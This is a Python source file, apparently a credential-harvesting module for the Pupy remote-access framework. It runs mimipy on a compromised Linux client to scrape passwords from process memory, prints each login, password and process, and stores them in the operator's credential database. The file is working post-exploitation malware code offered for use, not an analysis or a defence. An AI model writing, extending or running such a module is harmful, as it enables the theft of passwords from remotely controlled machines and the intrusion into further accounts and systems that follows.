# -*- coding: utf-8 -*-
import os
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import obtain
from pupylib.utils.credentials import Credentials

__class_name__="MimipyMod"

@config(cat="creds", compat="linux")
class MimipyMod(PupyModule):
    """
        Run mimipy to retrieve credentials from memory
    """
    dependencies=['memorpy', 'mimipy']

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog='mimipy', description=self.__doc__)
        self.arg_parser.add_argument('-v', '--verbose', default=False, action='store_true', help='be more verbose !')

    def run(self, args):
        found=False
        db = Credentials(client=self.client.short_name(), config=self.config)
        
        for t, process, u, passwd in self.client.conn.modules['mimipy'].mimipy_loot_passwords(optimizations="nsrx", clean=False):
            cred={
                'Password': passwd,
                'Login': u,
                'Host' : process,
                'Category': 'Mimipy: %s'%t,
                'CredType': 'password'
            }
            self.success('\n\t'.join(["%s: %s"%(i,v) for i,v in cred.iteritems()])+"\n\n")
            db.add([cred])
            found=True
        if not found:
            self.success("no password found :/")

